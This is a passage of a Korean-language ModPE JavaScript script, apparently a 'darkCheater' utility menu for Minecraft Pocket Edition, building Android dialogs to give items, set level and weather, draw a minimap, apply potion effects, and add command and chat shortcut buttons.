layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("플레이어 목록");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(tf){
if(list.getText()=="") list.setText(Player.getName(player)+"::"+player);
else list.setText(list.getText()+"\n"+Player.getName(player)+"::"+player);
}
else{
if(list.getText()=="") list.setText(Player.getName(player)+"");
else list.setText(list.getText()+"\n"+Player.getName(player));
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputLevelAndExp(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setTextColor(white);
loc2.setTextColor(white);
loc1.setText("레벨 : ");
loc1.setTextSize(18);
loc2.setHint("레벨을 입력하세요...");
loc2.setText(Player.getLevel()+"");
loc2.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setTextColor(white);
loc4.setTextColor(white);
loc3.setText("경험치 : ");
loc3.setTextSize(18);
loc4.setHint("경험치를 입력하세요...");
loc4.setText(Player.getExp()+"");
loc4.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL);
layout.addView(loc3);
layout.addView(loc4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("레벨/경험치 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Player.setLevel(loc2.getText());
Player.setExp(loc4.getText());
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function weatherSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("비 강도 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("비 강도를 입력하세요...");
loc2.setText(Level.getRainLevel()+"");
loc2.setTextColor(white);
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL);
loc3.setText("번개 강도 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("번개 강도를 입력하세요");
loc2.setText(Level.getLightningLevel()+"");
loc4.setTextColor(white);
loc4.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("날씨 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Level.setRainLevel(loc2.getText());
Level.setLightningLevel(loc4.getText());
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showPcItems(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loadWeb = new android.webkit.WebView(ctx);
loadWeb.setWebChromeClient(new android.webkit.WebChromeClient());
loadWeb.setWebViewClient(new android.webkit.WebViewClient());
loadWeb.loadUrl("http:\/\/postfiles.naver.net\/20151030_105\/dt3141592_1446132406907EWh3O_PNG\/2015-09-18_18.05.03.png");
layout.addView(loadWeb);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 아이디 (PC)");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showPotionRecipe(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loadWeb = new android.webkit.WebView(ctx);
loadWeb.setWebChromeClient(new android.webkit.WebChromeClient());
loadWeb.setWebViewClient(new android.webkit.WebViewClient());
loadWeb.loadUrl("http:\/\/darktornado.dothome.co.kr\/darkCheater\/potionRecipe.jpeg");
layout.addView(loadWeb);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 조합법");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showItemTexture(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
var imageView = new android.widget.ImageView(ctx);
var item = new android.graphics.BitmapFactory.decodeStream(ModPE.openInputStreamFromTexturePack("images/items-opaque.png"));
imageView.setImageBitmap(item);
var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
imageView.setLayoutParams(svParams);
layout.addView(imageView);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
if(tf){
dialog.setTitle("items-opaque.png");
dialog.setNegativeButton("닫기", null);
}
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectColor(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var na = new android.widget.CheckBox(ctx);
na.setText("불투명하게 설정");
if(Dark.read("alpha")=="true") na.setChecked(true);
else na.setChecked(false);
na.setTextColor(white);
na.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
Dark.save("alpha", onoff);
}
}));
layout.addView(na);
//--
if(Dark.read("colorData")=="") var rgb = [0, 0, 0];
else var rgb = Dark.read("colorData").toString().split(",");
var txt = new android.widget.TextView(ctx);
txt.setText("\n미리보기");
txt.setTextSize(23);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
txt.setGravity(android.view.Gravity.CENTER);
var r1 = new android.widget.TextView(ctx);
r1.setText("R : "+rgb[0]);
r1.setTextSize(18);
var r2 = new android.widget.SeekBar(ctx);
r2.setMax(255);
r2.setProgress(rgb[0]);
r2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
rgb[0] = seek.getProgress();
r1.setText("R : "+rgb[0]);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
}
}));
var g1 = new android.widget.TextView(ctx);
g1.setText("G : "+rgb[1]);
g1.setTextSize(18);
var g2 = new android.widget.SeekBar(ctx);
g2.setMax(255);
g2.setProgress(rgb[1]);
g2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
rgb[1] = seek.getProgress();
g1.setText("G : "+rgb[1]);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
}
}));
var b1 = new android.widget.TextView(ctx);
b1.setText("B : "+rgb[2]);
b1.setTextSize(18);
var b2 = new android.widget.SeekBar(ctx);
b2.setMax(255);
b2.setProgress(rgb[2]);
b2.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
rgb[2] = seek.getProgress();
b1.setText("B : "+rgb[2]);
txt.setTextColor(android.graphics.Color.argb(255, rgb[0], rgb[1], rgb[2]));
}
}));
//--
var type = null;
var types = ["검정(기본)", "하양", "빨강", "초록", "파랑", "노랑", "청록", "보라", "직접 입력"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
type = p;
try{
if(p==8){
layout.addView(txt);
layout.addView(r1);
layout.addView(r2);
layout.addView(g1);
layout.addView(g2);
layout.addView(b1);
layout.addView(b2);
}
else{
layout.removeView(txt);
layout.removeView(r1);
layout.removeView(r2);
layout.removeView(g1);
layout.removeView(g2);
layout.removeView(b1);
layout.removeView(b2);
}
}
catch(e){
return;
Dark.toast(e);
}
}
}));
layout.addView(spin);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("메뉴 색상 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.save("color", type);
if(type==8){
Dark.save("colorData", rgb[0]+","+rgb[1]+","+rgb[2]);
Dark.toast("R ; "+rgb[0]+", G ; "+rgb[1]+", B : "+rgb[2]+"(으)로 수정되었습니다.");
}
else{
Dark.toast(types[type]+"(으)로 수정되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showItemList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var names = [], codes = [];
for(var n=0;n<4096;n++){
if(net.zhuoweizhang.mcpelauncher.ScriptManager.nativeIsValidItem(n)){
names.push(n+"번 : "+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetItemName(n, 0, false));
codes.push(n);
}
}
var codes2 = [0, 64, 95, 97, 140, 144, 246, 248, 249, 255, 373, 383];
var names2 = ["공기", "문(블록)", "보이지 않는 베드락", "몬스터 스폰알(?)", "화분", "머리", "빛나는 옵시디언", "업데이트 블록 1", "업데이트 블록 2", "오류 돌", "물병(포션)", "스폰알"];
for(var n in codes2)
names.splice(codes.indexOf(codes2[n]), 1, codes2[n]+ "번 : "+names2[n]);
dialog.setItems(names, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
var codes3 = [1, 5, 6, 17, 18, 24, 35, 38, 43, 44, 79, 97, 98, 155, 159, 161, 162, 171, 175, 333, 349, 350, 351, 373, 383, 438];
if(codes3.indexOf(codes[w])!=-1){
itemDamageList(names[w], codes[w], codes3.indexOf(codes[w]));
}
else{
if(Level.getGameMode()==0){
inputAmount(codes[w], 0);
}
else{
Entity.setCarriedItem(Player.getEntity(), codes[w], 5, 0);
Dark.toast("설정되었습니다.");
}
}
}
}));
dialog.setTitle("아이템 아이디 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function itemDamageList(title, code, nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var codes3 = [1, 5, 6, 17, 18, 24, 35, 38, 43, 44, 79, 97, 98, 155, 159, 161, 162, 171, 175, 333, 349, 350, 351, 373, 383, 438];
var lengths = [7, 6, 6, 4, 4, 3, 16, 9, 8, 8, 2, 6, 3, 3, 16, 2, 2, 16, 6, 6, 4, 4, 16, 36, null, 36];
var names = [], codes = [];
if(code==383){
var entityIds = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45];
for(var n=0;n<entityIds.length;n++){
names.push("아이템 데미지 : "+entityIds[n]+", 이름 : "+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetItemName(code, entityIds[n], false));
codes.push(entityIds[n]);
}
var codes2 = [20, 21, 44];
var names2 = ["아이언 골램 생성", "스노우 골램 생성", "좀비 주민 생성"];
for(var n in codes2)
names.splice(codes.indexOf(codes2[n]), 1, "아이템 데미지 : "+codes2[n]+", 이름 : "+names2[n]);
}
else{
for(var n=0;n<lengths[nn];n++){
names.push("아이템 데미지 : "+n+", 이름 : "+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetItemName(code, n, false));
codes.push(n);
}
}
dialog.setItems(names, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(Level.getGameMode()==0){
inputAmount(code, codes[w]);
}
else{
Entity.setCarriedItem(Player.getEntity(), code, 5, codes[w]);
Dark.toast("설정되었습니다.");
}
}
}));
dialog.setTitle(title);
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputAmount(itemId, itemDemage){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("개수를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 지급 - 개수 입력");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
addItemInventory(itemId, loc2.getText(), itemDemage);
Dark.toast("지급되었습니다");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeMiniMap(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
miniMap = new android.widget.PopupWindow();
var mx, my, mz;
mx = Math.round(Player.getX()-0.5);
my = Player.getY()-2;
mz = Math.round(Player.getZ()-0.5);
var mapData = new android.graphics.Bitmap.createBitmap(2*8*10, 2*8*10, android.graphics.Bitmap.Config.ARGB_8888);
var canvas = new android.graphics.Canvas(mapData);
var p = new android.graphics.Paint();
for(var n=-8;n<8+1;n++){
for(var m=-8;m<8+1;m++){
for(var yy=my+2;yy>my-3;yy--){
var b = getTile(mx+n, yy, mz+m);
if(b!=0) break;
}
if(b==0) p.setARGB(0, 0, 0, 0);
else if(b==2||b==253||b==31||b==175||b==37||b==38||b==39||b==40) p.setARGB(255, 0, 255, 45);
else if(b==3||b==243||b==159||b==172||b==60||b==248||b==249) p.setARGB(255, 153, 109, 0);
else if(b==1||(b>=13&&b<=16)||b==4||b==21||b==48||b==82||b==98||b==110||b==129||b==139||b==61||b==62||b==245||b==67||b==71||b==73||b==74||b==109||b==255||b==101) p.setARGB(255, 120, 120, 120);
else if(b==8||b==9||b==22) p.setARGB(255, 0, 0, 255);
else if(b==79||b==174||b==247) p.setARGB(255, 160, 180, 255);
else if(b==5||b==17||b==32||b==47||b==53||b==54||b==58||b==63||b==64||b==65||b==68||b==85||b==107||b==134||b==135||b==136||b==157||b==158||b==162||b==163||b==164||b==183||b==184||b==185||b==186||b==187||b==96) p.setARGB(255, 164, 135, 81);
else if(b==6||b==18||b==81||b==83||b==103||b==104||b==105||b==106||b==111||b==120||b==133||b==141||b==142||b==161||b==244||b==254) p.setARGB(255, 64, 148, 0);
else if(b==10||b==11||b==51||b==26||b==27||b==46||b==152||b==246) p.setARGB(255, 255, 0, 0);
else if(b==12||b==24||b==19||b==41||b==89||b==121||b==170||b==198) p.setARGB(255, 255, 255, 0);
else if(b==86||b==91||b==127) p.setARGB(255, 255, 180, 0);
else if(b==57) p.setARGB(255, 0, 255, 255);
else if(b==87) p.setARGB(255, 150, 0, 0);
else if(b==45) p.setARGB(255, 150, 80, 65);
else if(b==20||b==30||b==35||b==42||b==43||b==44||b==78||b==80||b==92||b==95||b==102||b==126||b==155||b==156||b==171||b==50) p.setARGB(255, 255, 255, 255);
else p.setARGB(255, 0, 0, 0);
canvas.drawRect((n+8)*10, (m+8)*10, (n+8+1)*10, (m+8+1)*10, p);
}}
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 0, 0, 0);
canvas.drawText("●", 8*10, 8*10, p);
var players2 = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players2.push(e);
}
var players = removeDouble(players2);
var px, pz;
for each(var pp in players){
px = Math.abs(mx-Entity.getX(pp));
pz = Math.abs(mz-Entity.getZ(pp));
if(px<=8&&pz<=8&&ad!=pp){
p.setTextSize(20);
p.setTextAlign(android.graphics.Paint.Align.CENTER);
p.setARGB(255, 255, 255, 255);
canvas.drawText("●", Math.round((mx-Entity.getX(pp))+8)*10, Math.round((mz-Entity.getZ(pp))+8)*10, p);
}
}
var back = new android.graphics.drawable.BitmapDrawable(mapData);
miniMapData.setBackgroundDrawable(back);
setDragListener(miniMap, miniMapData, 0, true);
miniMap.setContentView(miniMapData);
miniMap.setWidth(dip2px(ctx, 120));
miniMap.setHeight(dip2px(ctx, 120));
miniMap.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(100, 120, 120, 120)));
miniMap.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, dip2px(ctx, 3), dip2px(ctx, 3));
miniMapTime = 11;
}
else{
if(miniMap!=null){
miniMap.dismiss();
miniMap = null;
}
miniMapTime = 0;
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function giveEffectToEntity(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var type = null;
var names = ["포화", "흡수", "체력 신장", "위더", "독", "나약함", "허기", "야간투시", "실명", "투명화", "수중 호흡", "화염저항", "저항", "재생", "멀미", "점프 강화", "즉시 데미지", "즉시 회복", "힘", "피로", "성급함", "구속", "신속"];
var types = [MobEffect.saturation, MobEffect.absorption, MobEffect.healthBoost, MobEffect.wither, MobEffect.poison, MobEffect.weakness, MobEffect.hunger, MobEffect.nightVision, MobEffect.blindness, MobEffect.invisibility, MobEffect.waterBreathing, MobEffect.fireResistance, MobEffect.damageResistance, MobEffect.regeneration, MobEffect.confusion, MobEffect.jump, MobEffect.harm, MobEffect.heal, MobEffect.damageBoost, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.movementSlowdown, MobEffect.movementSpeed];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, names);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
type = types[p];
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
var loc7 = new android.widget.TextView(ctx);
var loc8 = new android.widget.EditText(ctx);
loc1.setText("엔티티 코드 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("엔티티 코드를 입력하세요(생략시 모든 엔티티)...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("범위 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("범위(반경)를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number);
loc5.setText("지속 시간 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("지속 시간을 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
loc7.setText("강도 : ");
loc7.setTextSize(18);
loc7.setTextColor(white);
loc8.setHint("강도를 입력하세요......");
loc8.setTextColor(white);
loc8.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 부여 (엔티티)");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
var px, py, pz;
var r = loc4.getText();
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(ad)-Entity.getX(e));
py = Math.abs(Entity.getY(ad)-Entity.getY(e));
pz = Math.abs(Entity.getZ(ad)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&ad!=e){
if(loc2.getText().toString()==""&&!Player.isPlayer(e)&&Entity.getEntityTypeId(e)!=83){
try{
Entity.addEffect(e, type, 20*Number(loc6.getText()), Number(loc8.getText())-1, true, false);
}
catch(err){
//null;
}
Dark.toast("플레이어와 그림은 예외입니다.");
}
else if(Entity.getEntityTypeId(e)==loc2.getText()){
try{
Entity.addEffect(e, type, 20*Number(loc6.getText()), Number(loc8.getText())-1, true, false);
}
catch(err){
//null;
}
}
}
}
Dark.toast("포션 효과를 부여하였습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeCmdBtn(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
c.btn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("cmd");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
cmdList();
}
}));
setDragListener(c.btn, button, 0);
layout.addView(button);
c.btn.setContentView(layout);
c.btn.setWidth(dip2px(ctx, 45));
c.btn.setHeight(dip2px(ctx, 30));
c.btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
c.btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, dip2px(ctx, 32), dip2px(ctx, 70));
}
else{
if(c.btn!=null){
c.btn.dismiss();
c.btn = null;
}
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function cmdList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(Dark.read("cmdList")!="") var cmds = (Dark.read("cmdList")+"\n설정").split("\n");
else var cmds = ["설정"];
dialog.setItems(cmds, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(w==cmds.length-1){
cmdBtnOption();
}
else{
try{
if(c.mode) net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(cmds[w]);
else net.zhuoweizhang.mcpelauncher.ScriptManager.callScriptMethod("procCmd", [cmds[w].substring(1, cmds[w].length.toString())]);
Dark.toast("명령어 \""+cmds[w]+"\"(을)를 사용하였습니다.");
}
catch(e){
clientMessage(e);
}
}
}
}));
dialog.setTitle("명령어 단축키 - 명령어 목록");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function cmdBtnOption(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var cmdType = 0;
var cmds = ["스크립트 명령어", "서버 명령어"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, cmds);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
cmdType = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("명령어 목록 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("명령어를 입력하세요...");
loc2.setTextColor(white);
if(Dark.read("cmdList")!="") loc2.setText(Dark.read("cmdList")+"");
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(cmdType==0) c.mode = false;
if(cmdType==1) c.mode = true;
if(loc2.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/cmdList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("cmdList", loc2.getText().toString());
}
Dark.toast("저장되었습니다.");
}
}));
dialog.setTitle("명령어 단축키 - 설정");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function makeChatBtn(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
sBtn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("chat");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
chatList();
}
}));
setDragListener(sBtn, button, 0);
layout.addView(button);
sBtn.setContentView(layout);
sBtn.setWidth(dip2px(ctx, 45));
sBtn.setHeight(dip2px(ctx, 30));
sBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
sBtn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, dip2px(ctx, 82), dip2px(ctx, 70));
}
else{
if(sBtn!=null){
sBtn.dismiss();
sBtn = null;
}
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function chatList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
if(Dark.read("chatList")!="") var chats = (Dark.read("chatList")+"\n설정").split("\n");
else var chats = ["설정"];
dialog.setItems(chats, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(w==chats.length-1){
chatBtnOption();
}
else{
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(chats[w]);
if(fixSendChat) clientMessage("<"+Player.getName(ad)+"> "+chats[w]);
Dark.toast("채팅을  보냈습니다("+chats[w]+").");
}
}
}));
dialog.setTitle("채팅 단축키 - 채팅 목록");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function chatBtnOption(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("채팅 목록 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("채팅을 입력하세요...");
loc2.setTextColor(white);
if(Dark.read("chatList")!="") loc2.setText(Dark.read("chatList")+"");
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(loc2.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/chatList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("chatList", loc2.getText().toString());
}
Dark.toast("저장되었습니다.");
}
}));
dialog.setTitle("채팅 단축키 - 설정");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function serverSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuS2 = new android.widget.PopupWindow();
var title = makeTitle("서버 관련");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var menusT = ["PVP 방지", "서버원 공중부양 방지", "표지판 TP", "명령어 단축키", "채팅 단축키", "연속 채팅 방지", "블록 설치 내역 기록", "서버원 접속 방지", "하이퍼 로그 사용", "블록 설치 방지", "The Seed"];
var btnT = new Array();
for(var n in menusT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menusT[n]);
btnT[n].setTextOff(menusT[n]);
btnT[n].setTextColor(white);
}
btnT[0].setChecked(noPvp);
btnT[1].setChecked(f.tf);
btnT[2].setChecked(signTp);
if(c.btn==null) btnT[3].setChecked(false);
else btnT[3].setChecked(true);
if(sBtn==null) btnT[4].setChecked(false);
else btnT[4].setChecked(true);
btnT[5].setChecked(antiChat);
btnT[6].setChecked(blockLog);
btnT[7].setChecked(noPlayer);
btnT[8].setChecked(hyperLogOn);
btnT[9].setChecked(antiBlock);
btnT[10].setChecked(theSeed);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
noPvp = onoff;
}
}));
